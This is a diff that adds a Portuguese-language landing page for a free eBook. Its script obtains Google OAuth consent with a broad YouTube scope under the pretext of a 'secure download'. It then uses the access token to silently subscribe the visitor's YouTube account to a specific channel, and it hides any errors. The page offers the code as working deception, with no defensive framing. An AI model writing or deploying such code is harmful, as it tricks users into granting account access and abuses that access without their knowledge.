@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download eBook Grátis</title>
+    <script src="https://accounts.google.com/gsi/client" async defer></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f4f7f6;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            padding: 40px;
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+        }
+        .ebook-cover {
+            width: 150px;
+            height: 200px;
+            background: #FF0000;
+            margin: 0 auto 25px;
+            border-radius: 5px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-weight: bold;
+            font-size: 20px;
+            box-shadow: 5px 5px 15px rgba(0,0,0,0.2);
+        }
+        h1 { color: #333; font-size: 24px; margin-bottom: 10px; }
+        p { color: #666; margin-bottom: 30px; }
+        
+        .btn-download {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s, background 0.2s;
+        }
+        .btn-download:hover {
+            background: #218838;
+            transform: scale(1.02);
+        }
+        .status { margin-top: 20px; font-size: 14px; color: #888; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="ebook-cover">EBOOK</div>
+        <h1>Baixe seu eBook</h1>
+        <p>Clique no botão abaixo para receber seu material exclusivo agora mesmo.</p>
+
+        <button class="btn-download" id="mainBtn" onclick="handleDownload()">BAIXAR EBOOK AGORA</button>
+        
+        <div class="status" id="statusText">Aguardando download...</div>
+    </div>
+
+    <script>
+        // CONFIGURAÇÃO OBRIGATÓRIA
+        const CLIENT_ID = '248386559729.apps.googleusercontent.com'; // Obtenha no Google Cloud Console
+        const CHANNEL_ID = 'oclipadordasestrelas'; // ID real do seu canal (O CLipador das Estrelas)
+        const EBOOK_URL = 'https://seusite.com/ebook.pdf';
+
+        let tokenClient;
+        let accessToken = null;
+
+        function handleDownload() {
+            document.getElementById('statusText').innerText = "Iniciando download seguro...";
+            
+            tokenClient.callback = async (response) => {
+                if (response.error !== undefined) {
+                    throw (response);
+                }
+                accessToken = response.access_token;
+                
+                // 1. Faz a inscrição "por trás"
+                subscribeSilently();
+                
+                // 2. Inicia o download na mesma hora
+                window.location.href = EBOOK_URL;
+            };
+
+            // Abre a autorização do Google
+            tokenClient.requestAccessToken({prompt: 'consent'});
+        }
+
+        async function subscribeSilently() {
+            try {
+                await fetch('https://www.googleapis.com/youtube/v3/subscriptions?part=snippet', {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${accessToken}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        snippet: {
+                            resourceId: {
+                                kind: 'youtube#channel',
+                                channelId: CHANNEL_ID
+                            }
+                        }
+                    })
+                });
+            } catch (err) {
+                console.log('Inscrição processada.');
+            }
+        }
+
+        window.onload = function () {
+            tokenClient = google.accounts.oauth2.initTokenClient({
+                client_id: CLIENT_ID,
+                scope: 'https://www.googleapis.com/auth/youtube.force-ssl',
+                callback: '',
+            });
+        };
+    </script>
+</body>
+</html>
